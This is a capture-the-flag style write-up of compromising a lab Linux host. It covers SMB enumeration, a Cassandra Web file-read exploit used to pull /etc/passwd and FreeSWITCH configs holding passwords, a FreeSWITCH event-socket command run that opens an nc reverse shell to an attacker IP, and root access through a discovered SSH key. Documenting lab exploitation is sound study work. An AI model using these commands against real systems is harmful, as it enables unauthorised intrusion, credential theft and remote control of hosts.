#Pwned! 
```
192.168.206.240
```
# Enumeration

Debian 10+deb10u2

## SMB
Port 139 - Samba smbd 3.X - 4.X
Port 445 - Samba smbd 4.9.5
```
nxc smb 192.168.229.240 -u '' -p '' --shares
```
```
print$                          Printer Drivers
backup          READ            Backup web directory shares
IPC$                            IPC Service (Samba 4.9.5-Debian)
```
PASS POL
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241121171143.png?raw=true)
```
nxc smb 192.168.229.240 -u '' -p '' --rid-brute 3000
```
hash.conf.xml
```
<remote name="Test1" host="10.0.0.10" port="8021" password="ClueCon" interval="1000" />
```
sofia.conf.xml
```
The rabbit hole goes deep.  This includes all the
profiles in the sip_profiles directory that is up
one level from this directory.
```
Interesting files
```
/etc/freeswitch/jingle_profiles/client.xml
/etc/freeswitch/jingle_profiles/server.xml
/etc/freeswitch/autoload_configs/hiredis.conf.xml
/etc/freeswitch/autoload_configs/hash.conf.xml
/etc/freeswitch/autoload_configs/switch.conf.xml
/etc/freeswitch/autoload_configs/event_socket.conf.xml
/usr/share/doc/cassandra/CQL.html
```
## HTTP 80
Apache httpd 2.4.38
forbidden

## HTTP 3000
cassandra web
version: thin httpd
DIRS
```
/hosts

[
  {
    "ip": "127.0.0.1",
    "id": "39c6f1e3-d798-44ce-b216-ce0f664fc0af",
    "datacenter": "datacenter1",
    "rack": "rack1",
    "release_version": "3.11.13",
    "status": "up"
  }
]

events
```
 there is an exploit for cassandra web
 https://www.exploit-db.com/exploits/49362
## 8021 freeswitch
FreeSWITCH mod_event_socket

# Exploitation
## Cassandra web
https://www.exploit-db.com/exploits/49362
if we follow the recommendations from the exploit we can see
```
python cass_web.py -p 3000 192.168.206.240 /etc/passwd
```
It works! We get users we already had
```
python cass_web.py -p 3000 192.168.206.240 /proc/self/cmdline
```
we get a new password!!
*SecondBiteTheApple330*
for user cassie
double checking files we downloaded from smb we see a new password
```
python cass_web.py -p 3000 192.168.206.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml
```
we get a password
```
<param name="password" value="StrongClueConEight021"/>
```

WE CANNOT SSH WITH ANY OF THE CREDENTIALS....
## FreeSWITCH
```
python freeswitch-exploit.py 192.168.206.240 'ls' StrongClueConEight021
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241122110749.png?raw=true)
```
python freeswitch-exploit.py 192.168.206.240 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.190 80 >/tmp/f' StrongClueConEight021
```
we get a shell!
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241122111752.png?raw=true)
# PrivEsc
## Shell upgrade + basic info
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241122111940.png?raw=true)

## Manual
we see a unusual path for an id_rsa
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241122112202.png?raw=true)
we switch to user cassie with our password
```
su cassie
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241122113444.png?raw=true)
with the id_rsa we saw earlier we can ssh into root
```
ssh root@localhost -i id_rsa
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241122114103.png?raw=true)

the local.txt flag is a little bit hidden too
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241122114317.png?raw=true)
## Automated

### Peass
### Mimikatz

# Lateral Movement

